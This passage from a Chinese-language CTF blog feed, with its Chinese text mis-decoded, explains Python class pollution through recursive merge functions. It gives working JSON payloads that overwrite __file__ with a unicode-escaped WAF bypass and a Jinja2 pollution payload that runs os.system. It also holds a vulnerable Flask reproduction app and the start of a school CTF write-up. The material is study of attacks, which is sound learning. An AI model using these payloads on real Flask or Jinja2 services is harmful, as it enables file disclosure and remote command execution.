class="string">&quot;username&quot;</span>]</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">&quot;Congratulations,The username and password is correct,Login Success!!!&quot;</span></span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;The username or password is incorrect,Login Failed,Please log in again!!!&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Hey bro,May be you should check your inputs,because it contains malicious data,Please don&#x27;t hack me~~~ :) :) :)&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(__file__, <span class="string">&quot;r&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br></pre></td></tr></table></figure><br>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°å…¶åœ¨/è·¯ç”±ä¸‹æ‰“å¼€äº†<code>__file__</code>æˆ‘ä»¬å¯ä»¥å°è¯•æ±¡æŸ“è¿™ä¸ª<code>__file__</code>å±æ€§,åœ¨ç™»é™†é¡µé¢è°ƒç”¨äº†åˆå¹¶å‡½æ•°ï¼Œè¿™ä¹Ÿå°±å¯¼è‡´äº†æœ‰æ±¡æŸ“çš„å…¥å£ã€‚æˆ‘ä»¬åœ¨çœ‹ä¸€ä¸‹ä¼šå‘ç°å…¶å°†<code>__init__</code>è¿›è¡Œäº†é‡å†™è¿™ä¹Ÿå°±å¯¼è‡´äº†æˆ‘ä»¬å¯ä»¥ä½¿ç”¨<code>__init__.__globals__</code>æ¥æ±¡æŸ“å…¨å±€å˜é‡ï¼Œå³<code>__file__</code><br>æ­£å¸¸æ³¨å†Œæ—¶æˆ‘ä»¬ä¼ çš„jsonè¡¨å•åº”è¯¥ä¸º<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;username&quot;:&quot;1&quot;,&quot;password&quot;:&quot;2&quot;&#125;</span><br></pre></td></tr></table></figure><br>è¿™å¹¶æ²¡æœ‰ä»€ä¹ˆé—®é¢˜ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥åœ¨ä¸Šé¢åŠ ç‚¹å°ä¸œè¥¿ã€‚å³å¯ä»¥åˆ©ç”¨<code>&#123;&quot;__init__&quot;:&#123;&quot;__globals__&quot;:&#123;&quot;__file__&quot;:&quot;è¦ä¿®æ”¹çš„æ–‡ä»¶è·¯å¾„&quot;&#125;&#125;&#125;</code>æ¥è¿›è¡Œæ±¡æŸ“<br>payload<br><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;username&quot;</span><span class="punctuation">:</span><span class="string">&quot;1&quot;</span><span class="punctuation">,</span><span class="attr">&quot;password&quot;</span><span class="punctuation">:</span><span class="string">&quot;2&quot;</span><span class="punctuation">,</span><span class="attr">&quot;__init__&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;__globals__&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;__file__&quot;</span><span class="punctuation">:</span><span class="string">&quot;è¦ä¿®æ”¹çš„æ–‡ä»¶è·¯å¾„&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><br>ç”±äºè¿™é¢˜åŠ äº†wafæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä½¿ç”¨unicodeç»•è¿‡ã€‚<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;username&quot;:1,&quot;password&quot;:2,&quot;\u005F\u005F\u0069\u006E\u0069\u0074\u005F\u005F&quot;:&#123;      &quot;\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f&quot;:&#123;&quot;\u005f\u005f\u0066\u0069\u006c\u0065\u005f\u005f&quot;:   &quot;/etc/machine-id&quot;&#125;&#125;,&quot;ykg6xtt2j2l&quot;:&quot;=&quot;&#125;</span><br></pre></td></tr></table></figure></p><h1 id="å…¶ä»–æ¨¡å—çš„æ±¡æŸ“"><a href="#å…¶ä»–æ¨¡å—çš„æ±¡æŸ“" class="headerlink" title="å…¶ä»–æ¨¡å—çš„æ±¡æŸ“"></a>å…¶ä»–æ¨¡å—çš„æ±¡æŸ“</h1><p>è¿™æ¬¡çš„æ ¡èµ›å¹¶æ²¡æœ‰æ‰“åˆ°å¯¹äºå…¶ä»–çš„ä»–æ¨¡å—çš„å˜é‡çš„æ±¡æŸ“ã€‚å¯è§å­¦é•¿è¿˜æ˜¯æ‰‹ä¸‹ç•™äº†æƒ…ã€‚<br>åœ¨å…¨å±€å˜é‡çš„å‰æä¸‹ï¼Œæ˜¯æˆ‘ä»¬éƒ½åœ¨å…¥å£æ–‡ä»¶ä¸­çš„ç±»å¯¹è±¡æˆ–è€…å±æ€§æ¥è¿›è¡Œæ“ä½œçš„ï¼Œä½†æ˜¯å¦‚æœæˆ‘ä»¬æ“ä½œçš„ä½ç½®åœ¨å…¥å£æ–‡ä»¶ä¸­ï¼Œè€Œç›®æ ‡å¯¹è±¡å¹¶ä¸åœ¨å…¥å£æ–‡ä»¶å½“ä¸­ï¼Œè¿™æ—¶å€™æˆ‘ä»¬å°±éœ€è¦å¯¹å…¶ä»–åŠ è½½è¿‡çš„æ¨¡å—æ¥è·å–äº†</p><h2 id="importåŠ è½½è·å–ï¼š"><a href="#importåŠ è½½è·å–ï¼š" class="headerlink" title="importåŠ è½½è·å–ï¼š"></a>importåŠ è½½è·å–ï¼š</h2><p>ä¸€èˆ¬pythonéƒ½æ˜¯é€šè¿‡importæ¥å¯¹æ¨¡å—è¿›è¡Œå¯¼å…¥çš„ï¼Œé‚£ä¹ˆæˆ‘é—¨è¦æ±¡æŸ“improtå¯¼å…¥çš„å¯¹è±¡åªéœ€è¦é‡æ–°å®šå‘å³å¯<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> DEMO</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">F</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="comment"># Recursive merge function</span></span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line">            <span class="comment">#// é€’å½’åˆå¹¶å‡½æ•°ï¼Œå°†dstå­—å…¸å†…çš„æ•°æ®åˆå¹¶è‡³secå†…</span></span><br><span class="line">merge(payload,instance)</span><br></pre></td></tr></table></figure><br>DEMO<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">b=1</span><br><span class="line">print(b)</span><br></pre></td></tr></table></figure><br>åƒä¸Šé¢çš„pythonä»£ç å¯¼å…¥äº†åº”è¯¥DEMOé‚£ä¹ˆæˆ‘ä»¬è¯¥å¦‚ä½•å¯¹DEMOé‡Œçš„å˜é‡è¿›è¡Œæ±¡æŸ“å‘¢ï¼Ÿå¾ˆç®€å•åªè¦åšä¸€ä¸ªé‡å®šå‘å³å¯äº†ã€‚<br>payload<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&#123;&quot;__init__&quot;:</span><br><span class="line">    &#123;&quot;__globals__&quot;:</span><br><span class="line">        &#123;&quot;DEMO&quot;:</span><br><span class="line">                &#123;&quot;b&quot;:2&#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><br><br>å¯ä»¥çœ‹åˆ°åœ¨æˆ‘ä»¬è¿è¡Œåè¾“å‡ºå€¼å˜ä¸ºäº†2ï¼Œè¿™å°±æ˜¯å› ä¸ºæˆ‘ä»¬å…ˆè·å–äº†å…¨å±€å˜é‡ï¼Œåœ¨ä¿®æ”¹DEMOä¸­çš„å€¼ï¼Œå°†bä¿®æ”¹ä¸º2.</p><h2 id="sysæ¨¡å—åŠ è½½è·å–ï¼š"><a href="#sysæ¨¡å—åŠ è½½è·å–ï¼š" class="headerlink" title="sysæ¨¡å—åŠ è½½è·å–ï¼š"></a>sysæ¨¡å—åŠ è½½è·å–ï¼š</h2><p>åœ¨è®¸å¤šçš„ç¯å¢ƒä¸­å¯¼å…¥æ¨¡å—å¹¶ä¸æ˜¯ç®€å•çš„åˆ©ç”¨importè¿›è¡Œå¯¼å…¥åŒçº§ç›®å½•ä¸‹çš„æ–‡ä»¶ï¼Œæ›´å¤šçš„æ˜¯åˆ©ç”¨ç¬¬ä¸‰æ–¹æ¨¡å—å’Œå†…ç½®æ¨¡å—è¿›è¡Œå¯¼å…¥ã€‚è¿™æ—¶å€™æˆ‘ä»¬å°±æ— æ³•ç®€å•çš„åˆ©ç”¨ä¸Šé¢çš„payloadè¿›è¡Œé‡å®šå‘äº†ï¼Œæˆ‘ä»¬éœ€è¦ä½¿ç”¨sysè¿™ä¸ªæ¨¡å—è¿›è¡Œå®šå‘ã€‚<br>sysæ¨¡å—ä¸­æœ‰ä¸€ä¸ªmoduleså±æ€§ï¼Œè¿™ä¸ªå±æ€§å¯ä»¥åŠ è¯¦ç»†è¿™ä¸ªç¨‹åºè¿è¡Œæ—¶å¯¼å…¥çš„æ‰€æœ‰æ¨¡å—ã€‚æ‰€æœ‰æˆ‘ä»¬å¯ä»¥é€šè¿‡ä»–æ¥è¿›è¡Œé‡å®šå‘ã€‚</p><h3 id="å®ä¾‹"><a href="#å®ä¾‹" class="headerlink" title="å®ä¾‹"></a>å®ä¾‹</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> DEMO</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="comment"># Recursive merge function</span></span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line">            <span class="comment">#// é€’å½’åˆå¹¶å‡½æ•°ï¼Œå°†dstå­—å…¸å†…çš„æ•°æ®åˆå¹¶è‡³secå†…</span></span><br><span class="line"><span class="built_in">print</span>(DEMO.a)</span><br><span class="line">instance =A()</span><br><span class="line">payload=&#123;<span class="string">&quot;__init__&quot;</span>:&#123;<span class="string">&quot;__globals__&quot;</span>:&#123;<span class="string">&quot;sys&quot;</span>:&#123;<span class="string">&quot;modules&quot;</span>:&#123;<span class="string">&quot;DEMO&quot;</span>:&#123;<span class="string">&quot;a&quot;</span>:<span class="number">2</span>&#125;&#125;&#125;&#125;&#125;&#125;</span><br><span class="line">merge(payload,instance)</span><br><span class="line"><span class="built_in">print</span>(DEMO.a)</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°æˆ‘ä»¬çš„payloadæ—¶å…ˆå®šä½åˆ°sysæ¨¡å—çš„moduleså±æ€§å†ä¿®æ”¹DEMOçš„å†…å®¹ã€‚<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;__init__&quot;:&#123;&quot;__globals__&quot;:&#123;&quot;sys&quot;:&#123;&quot;modules&quot;:&#123;&quot;DEMO&quot;:&#123;&quot;a&quot;:2&#125;&#125;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure></p><h3 id="è·å–sysæ¨¡å—"><a href="#è·å–sysæ¨¡å—" class="headerlink" title="è·å–sysæ¨¡å—"></a>è·å–sysæ¨¡å—</h3><p>æˆ‘ä»¬çŸ¥é“äº†å¯ä»¥ä½¿ç”¨sysæ¨¡å—æ¥é‡å®šä½ï¼Œä½†æ˜¯æˆ‘ç›¸ä¿¡æˆ‘ä»¬éƒ½æœ‰ä¸€ä¸ªç–‘é—®å°±æ˜¯å¦‚ä½•è·å–sysæ¨¡å—ã€‚</p><h4 id="é€šè¿‡åŠ è½½å™¨loaderè·å–sys"><a href="#é€šè¿‡åŠ è½½å™¨loaderè·å–sys" class="headerlink" title="é€šè¿‡åŠ è½½å™¨loaderè·å–sys"></a>é€šè¿‡åŠ è½½å™¨loaderè·å–sys</h4><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡loaderåŠ è½½å™¨æ¥è·å–sysæ¨¡å—çš„<br>loaderåŠ è½½å™¨åœ¨pythonä¸­çš„ä½œç”¨æ˜¯ä¸ºå®ç°æ¨¡å—åŠ è½½è€Œè®¾è®¡çš„ç±»ï¼Œå…¶åœ¨importlibè¿™ä¸€å†…ç½®æ¨¡å—ä¸­æœ‰å…·ä½“å®ç°ã€‚è€Œimportlibæ¨¡å—ä¸‹æ‰€æœ‰çš„pyæ–‡ä»¶ä¸­å‡å¼•å…¥äº†sysæ¨¡å—ï¼Œè¿™æ ·æˆ‘ä»¬å’Œä¸Šé¢çš„sysæ¨¡å—è·å–å·²åŠ è½½æ¨¡å—å°±è”ç³»èµ·æ¥äº†ï¼Œæ‰€ä»¥æˆ‘ä»¬çš„ç›®æ ‡å°±å˜æˆäº†åªè¦è·å–äº†åŠ è½½å™¨loaderï¼Œæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡<code>loader.__init__.__globals__[&#39;sys&#39;]</code>æ¥è·å–åˆ°sysæ¨¡å—ï¼Œç„¶åå†è·å–åˆ°æˆ‘ä»¬æƒ³è¦çš„æ¨¡å—ã€‚<br>é‚£ä¹ˆç°åœ¨æˆ‘ä»¬çš„é—®é¢˜å°±æ˜¯å¦‚ä½•è·å–loaderæ¨¡å—ã€‚<br>åœ¨Pythonä¸­ï¼Œ<strong>loader</strong>æ˜¯ä¸€ä¸ªå†…ç½®çš„å±æ€§ï¼ŒåŒ…å«äº†åŠ è½½æ¨¡å—çš„loaderå¯¹è±¡ï¼ŒLoaderå¯¹è±¡è´Ÿè´£åˆ›å»ºæ¨¡å—å¯¹è±¡ï¼Œé€šè¿‡<strong>loader</strong>å±æ€§ï¼Œæˆ‘ä»¬å¯ä»¥è·å–åˆ°åŠ è½½ç‰¹å®šæ¨¡å—çš„loaderå¯¹è±¡ã€‚<br>loaderè·å–åˆ°sys<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.&lt;æ¨¡å—å&gt;.__spec__.__init__.__globals__[&#x27;sys&#x27;]è·å–åˆ°sysæ¨¡å—</span><br><span class="line">2.&lt;æ¨¡å—å&gt;.__spec__.loader.__init__.__globals__[&#x27;sys&#x27;]</span><br></pre></td></tr></table></figure><br>è¿™ä¸ªæ–‡ç« å†™çš„æˆ‘æ˜¯æœ‰ç‚¹å¤´ç–¼çš„ï¼Œå¯¹pythonçš„äº†è§£å¤ªå°‘äº†ï¼Œå¯¼è‡´è®¸å¤šæ–¹æ³•å’Œå±æ€§æä¸æ¸…æ¥šï¼Œè€Œä¸”è¿™ä¸ªæ¼æ´çš„æ¦‚å¿µä¹Ÿå¾ˆå¤šï¼Œå¤´ç–¼</p><h1 id="æ»´æ»´2024å¹´11æœˆ20æ—¥å†™ä¸‹çš„ç¬”è®°"><a href="#æ»´æ»´2024å¹´11æœˆ20æ—¥å†™ä¸‹çš„ç¬”è®°" class="headerlink" title="æ»´æ»´2024å¹´11æœˆ20æ—¥å†™ä¸‹çš„ç¬”è®°"></a>æ»´æ»´2024å¹´11æœˆ20æ—¥å†™ä¸‹çš„ç¬”è®°</h1><p>å¾ˆä¹…ä¹‹å‰å°±çŸ¥é“äº†åŸå‹é“¾æ±¡æŸ“å…¶å®ä¹Ÿæ˜¯å¯ä»¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œçš„,ä½†ä¸€ç›´æ²¡æœ‰è®°è¿™ä¸ªç¬”è®°.ä»Šå¤©åœ¨ç ”ç©¶ä¸€äº›æ–°ä¸œè¥¿,çœ‹ç€çœ‹ç€å°±çœ‹åˆ°åŸå‹é“¾æ±¡æŸ“äº†.æƒ³äº†æƒ³å°±æ¥è®°ä¸€ä¸‹å§<br><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;__init__&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;__globals__&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;__loader__&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;__init__&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;__globals__&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;sys&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">              <span class="attr">&quot;modules&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;jinja2&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                  <span class="attr">&quot;runtime&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;exported&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;*;__import__(&#x27;os&#x27;).system(&#x27;dir&#x27;);#&quot;</span><span class="punctuation">]</span></span><br><span class="line">                  <span class="punctuation">&#125;</span></span><br><span class="line">                <span class="punctuation">&#125;</span></span><br><span class="line">              <span class="punctuation">&#125;</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">          <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><br>é€šè¿‡åŸå‹é“¾æ±¡æŸ“æ¥æ±¡æŸ“jinja2æ¨¡æ¿å†…çš„<br>å¤ç°ä»£ç å¦‚ä¸‹<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,request,render_template</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="comment"># Recursive merge function</span></span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">cls</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">instance = cls()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">if</span> request.data:</span><br><span class="line">        merge(request.json, instance)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line"></span><br><span class="line">app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>)</span><br></pre></td></tr></table></figure><br><img src="/2024/03/09/%E5%88%9D%E6%8E%A2python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/IMG_20241120-233736145.png" class=""><br>æˆ‘ä»¬éœ€è¦åœ¨ç¬¬ä¸€æ¬¡æ¨¡æ¿æ¸²æŸ“å‰å°±å¯¹å…¶è¿›è¡Œæ±¡æŸ“,æ‰å¯ä»¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œ</p><img src="/2024/03/09/%E5%88%9D%E6%8E%A2python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/IMG_20241120-233841990.png" class="">  <img src="/2024/03/09/%E5%88%9D%E6%8E%A2python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/IMG_20241120-233855573.png" class="">  <p>ä¸å‡†å¤‡ç‰¹åˆ«è¯¦ç»†çš„è®°å› ä¸ºè¿™äº›å¤§ä½¬çš„blogé‡Œå…¶å·²ç»å†™çš„å¾ˆæ¸…æ¥šäº†</p><p><a href="https://tttang.com/archive/1876/#toc_jinja_1">https://tttang.com/archive/1876/#toc_jinja_1</a></p>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
          <category> åŸå‹é“¾æ±¡æŸ“ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> åŸå‹é“¾æ±¡æŸ“ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ ¡èµ›wp</title>
      <link href="/2024/03/04/%E6%A0%A1%E8%B5%9Bwp/"/>
      <url>/2024/03/04/%E6%A0%A1%E8%B5%9Bwp/</url>
      
        <content type="html"><![CDATA[<h1 id="åŸºæœ¬ä¿¡æ¯"><a href="#åŸºæœ¬ä¿¡æ¯" class="headerlink" title="åŸºæœ¬ä¿¡æ¯"></a>åŸºæœ¬ä¿¡æ¯</h1><p>é˜Ÿä¼åï¼šå•¦å•¦å•¦å•¦</p><p>é˜Ÿä¼æˆå‘˜ï¼š</p><p>LSEï¼ˆ2023çº§ï¼‰</p><p>HBQï¼ˆ2023çº§ï¼‰</p><p>ZWKï¼ˆ2023çº§ï¼‰</p><h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="Sign-in"><a href="#Sign-in" class="headerlink" title="Sign_in"></a>Sign_in</h2><p>è§£é¢˜ï¼šLSE<br>F12æ‰“å¼€æºç æœç´¢100000ä¼šå‘ç°base64ç¼–ç ç›´æ¥è§£ç å°±æ˜¯flag<br><img src="/2024/03/04/%E6%A0%A1%E8%B5%9Bwp/1.png" class="" title="alt text"><br>æˆ–è€…ç›´æ¥ä½¿ç”¨æ§åˆ¶å°æ¥è°ƒç”¨jså‡½æ•°<br><img src="/2024/03/04/%E6%A0%A1%E8%B5%9Bwp/sign_in2.png" class="" title="alt text"></p><h2 id="PermissionDenied"><a href="#PermissionDenied" class="headerlink" title="PermissionDenied"></a>PermissionDenied</h2><p>è§£é¢˜äººï¼šLSE<br>è¿™é¢˜ä¸€æ‰“å¼€å°±æ˜¯æ–‡ä»¶ä¸Šä¼ ï¼Œæˆ‘ä»¬ç›´æ¥è‡ªå·±å†™ä¸€ä¸ªhtmlçš„æ–‡ä»¶ä¸Šä¼ æ–‡ä»¶<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>æ–‡ä»¶ä¸Šä¼ <span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://node5.anna.nssctf.cn:28191/&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;file&quot;</span>&gt;</span>æ–‡ä»¶åï¼š<span class="tag">&lt;/<span 